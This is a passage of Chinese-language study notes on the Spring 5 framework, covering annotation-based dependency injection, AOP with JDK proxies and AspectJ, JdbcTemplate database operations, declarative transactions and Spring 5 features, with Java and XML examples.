encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\nhttp://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd">\n  <context:component-scan base-package="com.pwddd.spring5.anno"></context:component-scan>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 将注解加到类上\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.stereotype.Service;\n\n@Service(value = "userService")\npublic class UserService {\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. 配置组件扫描过滤 组件扫描可以配置扫描某些组件、不扫描某些组件。\n\n<context:component-scan base-package="com.pwddd.spring5.anno" use-default-filters="false">\n    <context:include-filter type="annotation" expression="org.springframework.stereotype.Service"/>\n    <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>\n</context:component-scan>\n\n\n1\n2\n3\n4\n\n\n# 注入属性\n\n注入属性有下面几种注解的方式：\n\n * @Autowired：根据属性类型进行自动装配\n * @Qualifier：根据名称进行注入 这个@Qualifier注解的使用，和上面@Autowired一起使用\n * @Resource：可以根据类型注入，可以根据名称注入\n * @Value：注入普通类型属性\n\n测试类：\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Qualifier;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Service;\n\nimport javax.annotation.Resource;\n\n@Service(value = "userService")\npublic class UserService {\n//    @Autowired\n//    @Qualifier(value = "dao")\n  @Resource\n  public UserDao userDao;\n\n  @Value("halo")\n  public String name;\n\n  public void test(){\n      System.out.println(name);\n      userDao.add();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 完全注解开发\n\n使用一个类来替换xml文件，进行配置。\n\n@Configuration  // 声明这是一个配置类\n@ComponentScan(basePackages = {"com.pwddd.spring5.anno"})  //配置包扫描\npublic class SpringConfig {\n}\n\n\n1\n2\n3\n4\n\n\n测试代码AnnotationConfigApplicationContext使用类生成context对象\n\n@Test\npublic void test(){\n    ApplicationContext context = new AnnotationConfigApplicationContext(SpringConfig.class);\n    UserService userService = context.getBean("userService", UserService.class);\n    userService.test();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 注解方式的配置文件注入\n\npackage com.pwddd.spring5.dao.impl;  \n  \nimport com.pwddd.spring5.dao.UserDao;  \nimport com.pwddd.spring5.entity.User;  \nimport org.springframework.beans.factory.annotation.Autowired;  \nimport org.springframework.beans.factory.annotation.Value;  \nimport org.springframework.context.annotation.PropertySource;  \nimport org.springframework.stereotype.Repository;  \n  \n@Repository  \n@PropertySource("classpath:test.properties")  \npublic class UserDaoImpl implements UserDao {  \n  \n @Value("${properties.result}")  \n private String result;  \n  \n @Override  \n public User getUserByUserName(String username) {  \n System.out.println(result);  \n return new User("zhangsan","male",12);  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# SpringAOP\n\n\n# AOP概念\n\n面向切面编程（方面），利用 AOP 可以对业务逻辑的各个部分进行隔离，从而使得 业务逻辑各部分之间的耦合度降低，提高程序的可重用性，同时提高了开发的效率。 通俗描述：不通过修改源代码方式，在主干功能里面添加新功能。\n\n\n\n\n# AOP底层原理\n\nAOP底层使用动态代理实现，动态代理有两种，一种是有接口的情况，使用JDK的动态代理。\n\n\n\n第二种是没有接口的情况，使用cglib动态代理\n\n\n\nJDK动态代理实现的方式\n\n\n\n 1. 创建接口，定义相关的方法\n\npackage com.pwddd.spring5aop.test;\n\npublic interface UserDao {\n    int add(int a, int b);\n    String update(String id);\n}\n\npackage com.pwddd.spring5aop.test;\n\npublic class UserDaoImpl implements UserDao{\n    @Override\n    public int add(int a, int b) {\n        System.out.println("add... 方法执行了！");\n        return a+b;\n    }\n\n    @Override\n    public String update(String id) {\n        return id;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. 创建代理类\n\npackage com.pwddd.spring5aop.test;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.util.Arrays;\n\npublic class JDKProxy {\n    public static void main(String[] args) {\n        Class[] interfaces = {UserDao.class};\n        UserDaoImpl userDao = new UserDaoImpl();\n        UserDao dao = (UserDao) Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new UserDaoPRoxy(userDao));\n        System.out.println("result:"+dao.add(1, 2));\n    }\n}\n\nclass UserDaoPRoxy implements InvocationHandler{\n    private Object obj;\n\n    public UserDaoPRoxy(Object obj) {\n        this.obj = obj;\n    }\n\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n\n        // 方法执行之前\n        System.out.println("方法执行之前:"+method.getName()+ Arrays.toString(args));\n        Object result = method.invoke(obj, args);\n        System.out.println("方法执行之后:"+obj);\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# AOP相关概念\n\n连接点 - 类里的那些方法可以被增强，这些可以被增强的方法称为连接点 切入点 - 实际被真正增强的方法称为切入点 通知（增强） - 用于增强的逻辑部分 - 分为：前置、后置、环绕、异常、返回（最终）通知类型 切面 - 实际上把增强应用到切入点的过程，这个动作。\n\n\n# AOP环境准备\n\nSpring 框架一般都是基于 AspectJ 实现 AOP 操作。AspectJ 不是 Spring 组成部分，是一个独立 的AOP 框架，一般把 AspectJ 和 Spirng 框架一起使用，进行 AOP 操作。 基于AspectJ有两种实现AOP的操作方式：\n\n * 基于XML文件的方式\n * 基于注解的方式\n\n依赖的JAR包：\n\n\n\n切入点表达式\n切入点表达式作用：知道对哪个类里面的哪个方法进行增强\n语法结构： execution([权限修饰符] [返回值类型] [类全路径\\].方法名(\\[形参列表\\])\n举例 1：对 com.atguigu.dao.BookDao 类里面的 add 进行增强 \n\texecution(* com.atguigu.dao.BookDao.add(..)) \n举例 2：对 com.atguigu.dao.BookDao 类里面的所有的方法进行增强 \n\texecution(* com.atguigu.dao.BookDao.* (..)\n举例 3：对 com.atguigu.dao 包里面所有类，类里面所有方法进行增强 \n\texecution(* com.atguigu.dao.*.** (..))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 基于注解方式的配置\n\n 1. 创建增强类和被增强的方法\n\npublic class User {\n    public void add(){\n        /**\n         * 被增强方法\n         */\n        System.out.println("add........");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 创建增强类和相关增强方法\n\npublic class UserProxy {\n    /**\n     * 增强方法\n     */\n    public void before(){\n        System.out.println("before ..... UserProxy");\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 3. 进行配置，开启注解扫描，生成代理对象\n\n\x3c!--    开启注解扫描--\x3e\n <context:component-scan base-package="com.pwddd.spring5aop.aopanno" />\n\x3c!--    开启生成代理对象--\x3e\n <aop:aspectj-autoproxy />\n\n\n1\n2\n3\n4\n\n 4. 配置通知类型\n\n@Before(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void before(){\n    System.out.println("before ..... UserProxy");\n}\n\n@After(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void after(){\n    System.out.println("after ..... UserProxy");\n}\n@AfterThrowing(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void afterThrowing(){\n    System.out.println("afterThrowing ..... UserProxy");\n}\n\n@AfterReturning(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void afterReturning(){\n    System.out.println("afterReturning ..... UserProxy");\n}\n\n@Around(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable {\n\n    System.out.println("around ..... qian");\n    proceedingJoinPoint.proceed();\n    System.out.println("around ------ hou");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 5. 相同切入点表达式可抽取出来\n\n/**\n * 抽取相同的切入点表达式\n */\n@Pointcut(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void mypoint(){\n\n}\n\n/**\n * 增强方法\n */\n@Before(value = "mypoint()")\npublic void before(){\n    System.out.println("before ..... UserProxy");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n 6. 多个增强的方法作用于同一个方法，可以设置优先级\n\n@Component\n@Aspect\n@Order(1)\npublic class PersonProxy {\n    @Before(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\n    public void before(){\n        System.out.println("person ......");\n    }\n}\n\n从小到大优先级降低\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 7. 配置完全注解开发\n\npackage com.pwddd.spring5aop.aopanno;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.EnableAspectJAutoProxy;\n\n@Configuration\n@ComponentScan(basePackages = {"com.pwddd.spring5aop.aopanno"})  // 开启注解扫描\n@EnableAspectJAutoProxy(proxyTargetClass = true)  // 开启配置aop对象\npublic class SpringConfig {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> TIPS: 当程序运行抛出异常时，AfterThrowing、After存在，AfterReturning不存在。\n\n\n# 基于XML方式配置\n\n 1. 创建增强类、增强方法、被增强类、被增强方法\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * 增强类\n */\npublic class BookProxy {\n    /**\n     * 增强方法\n     */\n    public void before(){\n        System.out.println("before.....");\n    }\n}\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * 被增强类\n */\npublic class Book {\n    /**\n     * 被增强方法\n     */\n    public void buy(){\n        System.out.println("buy .....");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. 编写Spring配置文件\n\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xmlns:aop="http://www.springframework.org/schema/aop"\n     xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                      http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                      http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n\n  <bean id="book" class="com.pwddd.spring5aop.aopxml.Book" />\n  <bean id="bookProxy" class="com.pwddd.spring5aop.aopxml.BookProxy" />\n\n\x3c!--    // 配置切入点--\x3e\n  <aop:config>\n      <aop:pointcut id="buy" expression="execution(* com.pwddd.spring5aop.aopxml.Book.buy(..))"/>\n      <aop:aspect ref="bookProxy">\n          <aop:before method="before" pointcut-ref="buy" />\n      </aop:aspect>\n  </aop:config>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# JdbcTemplate\n\n\n# 概述\n\nSpring 框架对 JDBC 进行封装，使用 JdbcTemplate 方便实现对数据库操作。\n\n\n# 准备工作\n\n 1. 导入相关Jar包\n\n\n\n 2. 配置Spring配置文件，开启注解扫描、配置数据源、配置JDBCTemplate对象。\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n\x3c!--    开启注解扫描--\x3e\n    <context:component-scan base-package="com.pwddd.spring5.jdbc" />\n\x3c!--    导入配置文件--\x3e\n    <context:property-placeholder location="classpath:jdbc.properties" />\n\x3c!--    配置数据源--\x3e\n    <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n        <property name="url" value="${jdbc.url}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="driverClassName" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n\x3c!--    配置jdbcTemplate--\x3e\n    <bean id="jdbcTemplate" class="org.springframework.jdbc.core.JdbcTemplate">\n        <property name="dataSource" ref="dataSource" />\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 3. 编写相关业务方法\n\nservice\n\npackage com.pwddd.spring5.jdbc.service.impl;\n\nimport com.pwddd.spring5.jdbc.dao.BookDao;\nimport com.pwddd.spring5.jdbc.service.BookService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class BookServiceImpl implements BookService {\n\t@Autowired\n\tprivate BookDao bookDao;\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nDao\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.BookDao;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class BookDaoImpl implements BookDao {\n\t@Autowired\n\tprivate JdbcTemplate jdbcTemplate;\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 4. 编写测试方法\n\npackage com.pwddd.spring5.jdbc.test;\n\nimport com.pwddd.spring5.jdbc.service.BookService;\nimport org.junit.Test;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\n\npublic class TestJDBC {\n\n@Test\npublic void testJDBC(){\n\tApplicationContext applicationContext =\n\t\t\tnew ClassPathXmlApplicationContext("bean1.xml");\n\tBookService bookServiceImpl = applicationContext.getBean("bookServiceImpl", BookService.class);\n\tSystem.out.println(bookServiceImpl);\n}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# CRUD\n\n# CUD\n\n在进行增删改操作，调用jdbcTemplate的update方法进行。\n\n\n\n该方法有两个参数，第一个为SQL语句、第二个为可变参数。 测试代码：\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.BookDao;\nimport com.pwddd.spring5.jdbc.entity.Book;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class BookDaoImpl implements BookDao {\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n\n    @Override\n    public int add(Book book) {\n        String sql = "insert into book values(?,?,?)";\n        Object[] args = {book.getBookId(),book.getBookName(),book.getBookAuthor()};\n        return jdbcTemplate.update(sql,args);\n    }\n\n    @Override\n    public int deleteBookById(String id) {\n        String sql = "delete from book where bookid=?";\n        Object[] args = {id};\n        return jdbcTemplate.update(sql,args);\n    }\n\n    @Override\n    public int updateBookInfo(Book book) {\n        String sql = "update book set bookname=?,bookauthor=? where bookid=?";\n        Object[] args = {book.getBookName(),book.getBookAuthor(),book.getBookId()};\n        return jdbcTemplate.update(sql,args);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# R\n\njdbcTemplate查询总共分为三种情况：\n\n * 使用聚合函数查询单个值\n * 查询单条记录信息\n * 查询列表\n\n# 单值查询\n\n单值查询是利用SQL语句的聚合函数如Count查询单个字段。使用如下方法进行查询：\n\n\n\n该方法共两个参数，第一个为SQL语句，第二个参数为返回值的类型。 实例代码：\n\n@Override\npublic int queryBookNum() {\n    String sql = "select count(*) from book";\n    Integer integer = jdbcTemplate.queryForObject(sql, Integer.class);\n    return integer;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 单条记录查询\n\n单条记录查询的结果对应一个实体类。使用如下的方法进行查询：\n\n\n\n该方法有三个参数：\n\n * SQL语句\n * RowMapper 是接口，针对返回不同类型数据，使用这个接口里面实现类完成数据封装\n * 可变的SQL语句参数。\n\n实例代码：\n\n@Override\npublic Book queryBookById(String id) {\n    String sql = "select * from book where bookid=?";\n    Book book = jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<Book>(Book.class), id);\n    return book;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 集合查询\n\n集合查询的查询结果是一个集合，使用如下的方法进行查询：\n\n\n\n该方法的参数类似单条记录查询。\n\n实例代码：\n\n@Override\npublic List<Book> queryAllBook() {\n    String sql = "select * from book";\n    List<Book> books = jdbcTemplate.query(sql, new BeanPropertyRowMapper<Book>(Book.class));\n    return books;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 批量操作\n\n以上的方法都只能单次处理单条数据，往往遇到需要批量处理数据库数据的需求，上面的方法就力不从心了。jdbcTemplate也提供了数据库批量操作的方法。\n\n\n\n该方法的参数和上面增删改的操作方法相似，只是可变参数换成了Object数组的List集合，单个Object数组对应数据库中的一个记录。\n\n实例代码：\n\n@Override\npublic void batchDelete(List<Object[]> args) {\n    String sql = "delete from book where bookid=?";\n    jdbcTemplate.batchUpdate(sql,args);\n}\n\n@Override\npublic void batchUpdate(List<Object[]> args) {\n    String sql = "update book set bookname=?,bookauthor=? where bookid=?";\n    jdbcTemplate.batchUpdate(sql,args);\n}\n\n@Override\npublic void batchAdd(List<Object[]> args) {\n    String sql = "insert into book values(?,?,?)";\n    jdbcTemplate.batchUpdate(sql,args);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n测试代码：\n\n@Test\npublic void batch(){\n    List<Object[]> addArgs = new ArrayList<>();\n    Object[] o1 = {"100","test100","a100"};\n    Object[] o2 = {"200","test200","a200"};\n    Object[] o3 = {"300","test300","a300"};\n    addArgs.add(o1);\n    addArgs.add(o2);\n    addArgs.add(o3);\n//        bookServiceImpl.batchAdd(addArgs);\n    List<Object[]> updateArgs = new ArrayList<>();\n    Object[] ou1 = {"TEST100","a100","100"};\n    Object[] ou2 = {"TEST200","a200","200"};\n    Object[] ou3 = {"TEST300","a300","300"};\n    updateArgs.add(ou1);\n    updateArgs.add(ou2);\n    updateArgs.add(ou3);\n    bookServiceImpl.batchUpdate(updateArgs);\n    List<Object[]> delArgs = new ArrayList<>();\n    Object[] od1 = {"100"};\n    Object[] od2 = {"300"};\n    delArgs.add(od1);\n    delArgs.add(od2);\n    bookServiceImpl.batchDelete(delArgs);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# 事务\n\n\n# 概念\n\n事务是数据库操作最基本单元，逻辑上一组操作，要么都成功，如果有一个失败所有操作都失败。典型的业务场景就是转账，lucy 转账 100 元 给 mary，lucy 少 100，mary 多 100\n\n事务有四个特性：\n\n * 原子性\n * 一致性\n * 隔离性\n * 持久性\n\n\n# 测试代码\n\n模拟上述的转账的例子\n\n 1. 创建Dao\n\npackage com.pwddd.dao.impl;\n\nimport com.pwddd.dao.UserDao;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Repository;\n\n@Repository\npublic class UserDaoImpl implements UserDao {\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n\n    @Override\n    public void reduceMoney() {\n        String sql = "update bank set money=money-100 where id=1";\n        jdbcTemplate.update(sql);\n    }\n\n    @Override\n    public void addMoney() {\n        String sql = "update bank set money=money+100 where id=2";\n        jdbcTemplate.update(sql);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n 2. 创建Service\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.UserDao;\nimport com.pwddd.service.UserService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\n\n@Service\npublic class UserServiceImpl implements UserService {\n    @Autowired\n    private UserDao userDao;\n\n    @Override\n    public void accountMoney() {\n        userDao.reduceMoney();\n\n        int i = 1/0;\n        userDao.addMoney();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n如果没有事务，则当少钱之后报错，没有多钱，就会导致不一致的情况。\n\n\n# 事务的操作过程\n\n事务添加到 JavaEE 三层结构里面 Service 层（业务逻辑层） 在 Spring 进行事务管理操作有两种方式：\n\n * 编程式事务管理\n * 声明式事务管理（使用）\n\n编程式事务管理如图：\n\n\n\n声明式事务管理有两种实现方式：\n\n * 基于注解的实现\n * 基于XML的实现\n\n在 Spring 进行声明式事务管理，底层使用 AOP 原理，Spring 事务管理 API 提供一个接口，代表事务管理器，这个接口针对不同的框架提供不同的实现类。\n\n\n\n\n# 基于注解方式的事务管理\n\n完全注解开发的方式进行事务管理：\n\npackage com.pwddd.config;\n\nimport com.alibaba.druid.pool.DruidDataSource;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.jdbc.datasource.DataSourceTransactionManager;\nimport org.springframework.transaction.TransactionManager;\nimport org.springframework.transaction.annotation.EnableTransactionManagement;\n\nimport javax.sql.DataSource;\n\n@Configuration\n@ComponentScan(basePackages = "com.pwddd")\n@EnableTransactionManagement  // 开启事务\npublic class SpringConfig {\n\n    @Bean\n    public DruidDataSource getDataSource(){\n        DruidDataSource druidDataSource = new DruidDataSource();\n        druidDataSource.setUrl("jdbc:mysql://localhost:3306/srping5test");\n        druidDataSource.setDriverClassName("com.mysql.jdbc.Driver");\n        druidDataSource.setUsername("root");\n        druidDataSource.setPassword("123456");\n        return druidDataSource;\n    }\n\n    @Bean\n    public JdbcTemplate getJdbcTemplete(DruidDataSource dataSource){\n        JdbcTemplate jdbcTemplate = new JdbcTemplate();\n        jdbcTemplate.setDataSource(dataSource);\n        return jdbcTemplate;\n    }\n\n    @Bean\n    public TransactionManager getTransactionManager(DataSource dataSource){\n        DataSourceTransactionManager dataSourceTransactionManager = new DataSourceTransactionManager();\n        dataSourceTransactionManager.setDataSource(dataSource);\n        return dataSourceTransactionManager;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n在想要进行事务的类或者方法上添加注解\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.UserDao;\nimport com.pwddd.service.UserService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Service;\nimport org.springframework.transaction.annotation.Transactional;\n\n@Service\n@Transactional(propagation = Propagation.REQUIRED,isolation = Isolation.REPEATABLE_READ)\npublic class UserServiceImpl implements UserService {\n    @Autowired\n    private UserDao userDao;\n\n    @Override\n    public void accountMoney() {\n        userDao.reduceMoney();\n\n        int i = 1/0;\n        userDao.addMoney();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 注解相关参数解释\n\n在 service 类上面添加注解@Transactional，在这个注解里面可以配置事务相关参数。\n\n\n\n# propagation：事务传播行为\n\n\n\n\n\n# ioslation：事务隔离级别\n\n事务有特性成为隔离性，多事务操作之间不会产生影响。不考虑隔离性产生很多问题。在隔离性中常见的三个问题是：脏读、不可重复读、虚（幻）读。\n\n 1. 脏读：一个未提交事务读取到另一个未提交事务的数据\n\n\n\n 2. 不可重复读：一个未提交事务读取到另一提交事务修改数据\n\n\n\n 3. 虚读：一个未提交事务读取到另一提交事务添加数据\n\n解决以上问题，可以配置注解的相关参数。\n\n\n\n# timeout：超时时间\n\n事务需要在一定时间内进行提交，如果不提交进行回滚。默认值是 -1 ，设置时间以秒单位进行计算。\n\n# readOnly：是否只读\n\n读：查询操作，写：添加修改删除操作，readOnly 默认值 false，表示可以查询，可以添加修改删除操作。设置 readOnly 值是 true，设置成 true 之后，只能查询。\n\n# rollbackFor：回滚\n\n设置出现哪些异常进行事务回滚\n\n# noRollbackFor：不回滚\n\n设置出现哪些异常不进行事务回滚\n\n\n# 基于XML配置事务\n\n示例代码：\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:tx="http://www.springframework.org/schema/tx"\n       xmlns:aop="http://www.springframework.org/schema/aop"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\n                http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n    <context:component-scan base-package="com.pwddd" />\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean id="datasource" class="com.alibaba.druid.pool.DruidDataSource">\n        <property name="driverClassName" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="url" value="${jdbc.url}" />\n    </bean>\n    <bean id="transcationManager" class="org.springframework.jdbc.datasource.DataSourceTransactionManager">\n        <property name="dataSource" ref="datasource" />\n    </bean>\n\n    <tx:advice id="txadvice">\n        <tx:attributes>\n            <tx:method name="accountMoney" propagation="REQUIRED"/>\n        </tx:attributes>\n    </tx:advice>\n\n    <aop:config>\n        <aop:pointcut id="pt" expression="execution(* com.pwddd.service.impl.UserServiceImpl.*(..))"/>\n        <aop:advisor advice-ref="txadvice" pointcut-ref="pt" />\n    </aop:config>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# Spring5新特性\n\n\n# 概述\n\n> 整个 Spring5 框架的代码基于 Java8，运行时兼容 JDK9，许多不建议使用的类和方 法在代码库中删除\n\n\n# 整合日志框架\n\nSpring 5.0 框架自带了通用的日志封装。并且已经移除 Log4jConfigListener，官方建议使用 Log4j2。\n\n 1. 导入Jar包\n\n\n\n 2. 创建Log4j2.xml文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<Configuration status="DEBUG">\n    <Appenders>\n        <Console name="Console" target="SYSTEM_OUT">\n            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>\n        </Console>\n    </Appenders>\n    <Loggers>\n        <Root level="error">\n            <AppenderRef ref="Console"/>\n        </Root>\n    </Loggers>\n</Configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# Nullable注解\n\n@Nullable 注解可以使用在方法上面，属性上面，参数上面。表示方法返回可以为空，属性值可以 为空，参数值可以为空注解。\n\n\n# 核心容器支持函数式风格\n\n实例代码：\n\n@Test\n    public void testGenericApplicationContext() {\n        //1 创建 GenericApplicationContext 对象\n        GenericApplicationContext context = new GenericApplicationContext();\n        //2 调用 context 的方法对象注册\n        context.refresh();\n        context.registerBean("user1",User.class,() -> new User());\n        //3 获取在 spring 注册的对象\n        // User user = (User)context.getBean("com.atguigu.spring5.test.User");\n        User user = (User)context.getBean("user1");\n        System.out.println(user);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 支持整合Junit5\n\n 1. 引入spring test的依赖包\n\n 2. 编写Junit4测试类\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.SpringConfig;\nimport com.pwddd.spring5new.service.UserService;\nimport org.junit.Test;\nimport org.junit.runner.RunWith;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.test.context.ContextConfiguration;\nimport org.springframework.test.context.junit4.SpringJUnit4ClassRunner;\n\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(classes = SpringConfig.class)\npublic class TestJunit {\n    @Autowired\n    private UserService userService;\n\n    